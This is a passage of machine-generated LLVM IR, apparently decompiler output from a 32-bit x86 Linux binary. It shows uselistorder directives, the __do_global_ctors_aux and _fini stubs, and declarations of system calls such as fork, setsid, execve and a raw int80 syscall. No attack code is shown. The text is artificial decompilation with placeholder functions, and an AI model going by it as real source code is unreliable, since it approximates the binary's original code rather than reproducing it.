  uselistorder i8 0, { 39, 4, 7, 8, 40, 6, 5, 149, 150, 10, 157, 152, 153, 9, 155, 156, 154, 31, 158, 1, 2, 61, 62, 63, 159, 160, 34, 162, 11, 13, 83, 82, 12, 41, 163, 164, 165, 94, 95, 16, 173, 169, 170, 168, 14, 171, 172, 15, 32, 174, 175, 184, 185, 186, 187, 188, 199, 200, 18, 85, 84, 17, 86, 87, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 3, 195, 112, 113, 221, 114, 224, 42, 56, 37, 38, 79, 19, 223, 205, 206, 64, 207, 208, 209, 210, 211, 212, 43, 213, 21, 193, 194, 20, 151, 115, 116, 57, 29, 28, 0, 44, 45, 46, 117, 189, 77, 161, 179, 180, 176, 178, 177, 118, 119, 120, 121, 122, 123, 124, 125, 126, 22, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 30, 140, 141, 142, 143, 144, 145, 146, 147, 59, 222, 181, 182, 183, 148, 166, 167, 65, 66, 23, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 80, 81, 88, 89, 90, 91, 92, 93, 58, 35, 190, 191, 192, 196, 197, 198, 24, 201, 202, 36, 203, 33, 204, 214, 219, 218, 25, 215, 216, 27, 217, 26, 220, 60, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 119, 120, 13, 121, 122, 123, 124, 14, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 36, 43, 37, 38, 39, 40, 41, 42, 141, 142, 8, 9, 50, 1, 51, 60, 11, 17, 143, 144, 15, 10, 16, 145, 150, 151, 152, 153, 154, 157, 158, 159, 160, 12, 52, 2, 53, 61, 62, 30, 63, 147, 148, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 27, 89, 90, 91, 92, 28, 93, 24, 18, 46, 47, 48, 49, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 19, 185, 161, 162, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 20, 201, 202, 204, 205, 206, 207, 203, 210, 155, 0, 31, 32, 146, 94, 95, 96, 97, 98, 99, 100, 29, 101, 102, 103, 104, 105, 106, 21, 22, 3, 4, 107, 108, 23, 109, 110, 111, 112, 113, 115, 116, 117, 118, 34, 35, 114, 208, 149, 209, 211, 212, 213, 33, 44, 45, 54, 55, 56, 57, 58, 59, 156 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80549c1, { 1, 0 }
  uselistorder label %dec_label_pc_80549bd, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80549a1, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80549dc = load i32, i32* @global_var_80596a8.221, align 8
  %v10_80549e1 = icmp eq i32 %v0_80549dc, -1
  br i1 %v10_80549e1, label %dec_label_pc_80549fc, label %dec_label_pc_80549f0.preheader

dec_label_pc_80549f0.preheader:                   ; preds = %entry
  br label %dec_label_pc_80549f0

dec_label_pc_80549f0:                             ; preds = %dec_label_pc_80549f0.preheader, %dec_label_pc_80549f0
  %v4_80549f3 = phi i32 [ %v0_80549dc, %dec_label_pc_80549f0.preheader ], [ %v2_80549f5, %dec_label_pc_80549f0 ]
  %v0_80549f0 = phi i32 [ ptrtoint (i32* @global_var_80596a8.221 to i32), %dec_label_pc_80549f0.preheader ], [ %v1_80549f0, %dec_label_pc_80549f0 ]
  %v1_80549f0 = add i32 %v0_80549f0, -4
  call void @__pseudo_call(i32 %v4_80549f3)
  %v1_80549f5 = inttoptr i32 %v1_80549f0 to i32*
  %v2_80549f5 = load i32, i32* %v1_80549f5, align 4
  %v10_80549f7 = icmp eq i32 %v2_80549f5, -1
  %v1_80549fa = icmp eq i1 %v10_80549f7, false
  br i1 %v1_80549fa, label %dec_label_pc_80549f0, label %dec_label_pc_80549fc.loopexit

dec_label_pc_80549fc.loopexit:                    ; preds = %dec_label_pc_80549f0
  %v2_80549fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80549fc

dec_label_pc_80549fc:                             ; preds = %dec_label_pc_80549fc.loopexit, %entry
  %v2_80549fc = phi i32 [ %v2_80549fc.pre, %dec_label_pc_80549fc.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_80549fc

; uselistorder directives
  uselistorder i32 %v0_80549dc, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 45, 22, 36, 37, 38, 39, 51, 52, 53, 54, 5, 55, 1, 50, 23, 40, 3, 41, 42, 43, 6, 56, 57, 58, 59, 60, 61, 7, 48, 46, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 8, 2, 44, 9, 0, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_80596a8.221 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_80549f0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8054a07 = load i32, i32* @ebx, align 4
  %v1_8054a08 = call i32 @__get_pc_thunk_bx(i32 %v0_8054a07)
  store i32 %v1_8054a08, i32* @eax, align 4
  %v0_8054a13 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8054a13

; uselistorder directives
  uselistorder i32* @eax, { 13, 30, 103, 2, 104, 105, 1, 106, 0, 29, 102, 107, 31, 108, 54, 55, 57, 14, 56, 109, 114, 110, 111, 112, 113, 4, 5, 90, 91, 201, 115, 45, 35, 122, 36, 123, 124, 125, 126, 48, 49, 142, 143, 50, 144, 38, 145, 39, 40, 41, 146, 147, 148, 149, 42, 150, 151, 152, 153, 43, 135, 189, 203, 47, 204, 205, 207, 51, 208, 6, 206, 10, 12, 202, 100, 15, 58, 59, 155, 60, 190, 192, 193, 191, 61, 62, 194, 195, 197, 198, 196, 154, 44, 7, 8, 131, 132, 133, 37, 134, 127, 128, 129, 130, 63, 64, 136, 137, 65, 66, 92, 94, 93, 95, 96, 98, 53, 97, 138, 139, 46, 140, 141, 116, 32, 33, 117, 118, 119, 120, 34, 121, 16, 67, 68, 69, 17, 18, 20, 19, 70, 72, 73, 71, 74, 75, 76, 77, 78, 21, 79, 22, 80, 23, 81, 24, 25, 82, 83, 84, 85, 86, 87, 88, 26, 89, 99, 27, 3, 28, 52, 101, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 184, 181, 182, 183, 185, 186, 187, 188, 209, 199, 200, 9, 11 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1170, 19, 20, 21, 117, 76, 687, 1171, 1174, 1172, 1173, 688, 951, 952, 291, 1185, 1177, 1179, 1180, 24, 66, 1181, 1182, 1183, 689, 1184, 130, 131, 132, 1175, 1176, 139, 1186, 1187, 1189, 1190, 1188, 1191, 254, 1192, 1193, 1194, 1195, 1196, 1197, 141, 142, 690, 326, 327, 809, 691, 810, 140, 811, 812, 813, 814, 815, 816, 79, 80, 817, 818, 819, 662, 820, 78, 692, 77, 693, 143, 144, 694, 22, 695, 821, 23, 696, 145, 328, 697, 698, 146, 699, 1200, 700, 1198, 233, 1199, 329, 330, 147, 148, 67, 701, 1201, 1202, 1203, 1204, 1205, 331, 702, 703, 149, 1206, 25, 81, 924, 113, 114, 704, 1207, 82, 705, 26, 706, 953, 332, 1208, 1209, 1210, 954, 955, 16, 255, 151, 150, 956, 957, 256, 958, 707, 1211, 1212, 708, 959, 709, 960, 961, 962, 963, 1213, 152, 710, 153, 333, 1220, 1216, 1217, 1218, 1219, 120, 27, 1233, 1234, 1247, 1248, 1249, 1250, 1256, 1257, 1258, 1259, 1251, 1252, 1253, 1254, 1255, 83, 84, 711, 1260, 1261, 154, 712, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 155, 1337, 1338, 156, 1339, 1340, 1341, 85, 121, 257, 133, 713, 122, 964, 157, 965, 28, 123, 115, 966, 215, 158, 967, 0, 968, 1221, 1222, 1229, 334, 1230, 714, 969, 335, 970, 971, 972, 973, 974, 975, 976, 159, 715, 977, 978, 979, 980, 160, 981, 716, 210, 336, 161, 717, 718, 719, 162, 982, 258, 983, 1323, 1324, 1325, 259, 314, 315, 1326, 1327, 1328, 1329, 1330, 1331, 720, 260, 984, 116, 721, 985, 163, 261, 262, 986, 987, 722, 988, 989, 990, 991, 109, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1, 216, 992, 124, 993, 217, 723, 724, 994, 164, 995, 1349, 1364, 1365, 1366, 337, 1367, 937, 1368, 830, 1421, 1422, 1423, 1424, 1425, 822, 1426, 1369, 1370, 1427, 165, 1428, 1439, 1440, 29, 725, 2, 138, 726, 727, 1452, 1456, 218, 1457, 166, 634, 338, 339, 3, 1429, 1430, 1431, 167, 168, 777, 661, 169, 728, 831, 263, 264, 170, 832, 833, 171, 172, 835, 834, 836, 837, 340, 635, 838, 840, 839, 841, 1432, 1433, 173, 729, 1438, 886, 887, 888, 889, 730, 731, 890, 891, 892, 265, 174, 175, 732, 823, 733, 824, 176, 734, 177, 735, 1159, 86, 1160, 1161, 1162, 1163, 1164, 4, 736, 1302, 737, 825, 826, 827, 828, 738, 178, 1441, 636, 179, 266, 1445, 1448, 1447, 1373, 267, 1374, 1375, 1376, 1377, 268, 1378, 1379, 1380, 341, 1371, 342, 1372, 343, 739, 842, 134, 843, 269, 740, 844, 741, 742, 344, 637, 743, 345, 638, 180, 744, 1381, 1382, 181, 182, 346, 639, 136, 69, 70, 1383, 1384, 1385, 1386, 1387, 1388, 183, 184, 347, 640, 135, 1389, 219, 1390, 118, 1391, 1392, 1394, 745, 1393, 5, 829, 6, 1446, 845, 846, 847, 848, 850, 849, 7, 270, 1350, 1351, 1352, 1280, 746, 271, 1281, 747, 1282, 1283, 1284, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1342, 1332, 185, 186, 748, 749, 272, 1453, 1455, 30, 1178, 8, 187, 996, 997, 348, 998, 188, 750, 999, 220, 125, 1303, 1304, 1000, 87, 1285, 273, 274, 189, 1001, 1002, 1003, 190, 1231, 88, 751, 1223, 752, 1228, 1227, 221, 753, 754, 1224, 1226, 1225, 222, 755, 851, 1232, 852, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 191, 756, 1016, 275, 1017, 1018, 1019, 1020, 1021, 31, 32, 757, 241, 242, 1022, 1023, 1024, 1025, 192, 1026, 1027, 1028, 758, 1029, 33, 34, 193, 759, 1030, 1031, 1032, 1035, 1033, 1034, 35, 71, 89, 1036, 1037, 1038, 1039, 316, 1040, 1041, 194, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 196, 1050, 1051, 1052, 760, 1053, 1054, 223, 224, 1055, 1056, 1057, 197, 195, 1058, 198, 1059, 1060, 761, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 199, 762, 763, 200, 1080, 1081, 1082, 764, 765, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 766, 767, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 768, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 276, 769, 277, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 278, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 36, 90, 91, 92, 93, 1139, 1140, 1141, 1142, 1143, 1144, 201, 1145, 770, 1146, 1147, 1148, 1149, 641, 1150, 1151, 1152, 1153, 1154, 1155, 202, 771, 119, 68, 110, 1068, 225, 1434, 1435, 226, 1437, 1436, 94, 349, 772, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 279, 1245, 203, 773, 774, 1246, 1156, 204, 1214, 775, 1215, 1420, 205, 1165, 1442, 1443, 1444, 853, 1333, 1348, 854, 1355, 1449, 137, 280, 1410, 1454, 1356, 1411, 855, 1357, 206, 856, 857, 858, 859, 860, 861, 863, 864, 862, 865, 1311, 1358, 1359, 866, 1450, 1451, 664, 211, 353, 642, 212, 354, 643, 867, 352, 95, 17, 18, 355, 868, 665, 362, 363, 284, 285, 283, 356, 644, 364, 365, 37, 207, 281, 350, 666, 869, 208, 282, 351, 663, 870, 227, 126, 358, 646, 292, 357, 645, 871, 872, 873, 874, 876, 234, 875, 667, 877, 366, 367, 368, 369, 878, 647, 648, 359, 360, 361, 243, 244, 245, 97, 880, 370, 879, 373, 374, 96, 371, 375, 376, 372, 881, 377, 882, 317, 883, 884, 885, 378, 127, 286, 38, 39, 893, 668, 669, 390, 391, 382, 894, 896, 383, 384, 895, 230, 897, 670, 392, 393, 379, 898, 900, 380, 381, 899, 229, 901, 318, 902, 903, 904, 905, 671, 394, 395, 385, 906, 908, 386, 387, 907, 228, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 672, 396, 397, 388, 919, 673, 398, 399, 389, 920, 921, 674, 400, 401, 922, 923, 675, 402, 403, 676, 404, 405, 677, 448, 449, 925, 293, 926, 40, 294, 927, 213, 928, 678, 407, 408, 679, 409, 410, 680, 411, 412, 681, 413, 414, 682, 415, 416, 214, 683, 417, 418, 929, 319, 930, 931, 932, 933, 406, 934, 649, 935, 936, 128, 938, 939, 240, 41, 238, 239, 940, 320, 941, 942, 943, 944, 650, 945, 420, 946, 651, 419, 237, 235, 42, 236, 652, 947, 948, 949, 950, 43, 421, 1157, 1158, 44, 72, 98, 246, 424, 422, 423, 653, 654, 425, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 655, 802, 803, 656, 298, 804, 295, 296, 297, 805, 806, 657, 427, 807, 1166, 1167, 45, 101, 1168, 46, 47, 426, 1169, 99, 73, 100, 428, 658, 15, 247, 248, 249, 1294, 429, 1295, 1296, 1297, 287, 1298, 106, 1299, 1300, 1301, 48, 102, 103, 104, 105, 659, 49, 50, 51, 52, 53, 9, 10, 11, 12, 1305, 1307, 1308, 1309, 432, 1310, 430, 299, 431, 300, 1306, 321, 433, 434, 288, 301, 289, 13, 290, 684, 435, 1312, 250, 251, 252, 253, 437, 1313, 436, 438, 302, 1314, 1315, 439, 54, 55, 1320, 56, 74, 1321, 303, 1316, 1317, 440, 441, 1318, 1319, 322, 442, 443, 444, 304, 660, 1322, 1334, 1335, 1336, 685, 305, 445, 447, 307, 446, 306, 107, 57, 75, 1343, 1344, 323, 1345, 1346, 129, 1347, 58, 324, 108, 686, 1353, 450, 451, 452, 1354, 454, 453, 1360, 1361, 1362, 1363, 455, 59, 456, 457, 458, 459, 460, 1404, 112, 111, 60, 310, 311, 1395, 1396, 1397, 1398, 231, 308, 309, 312, 1399, 1400, 1401, 1402, 61, 62, 63, 1403, 325, 64, 65, 1405, 1406, 313, 776, 14, 1407, 1408, 1409, 209, 808, 232, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
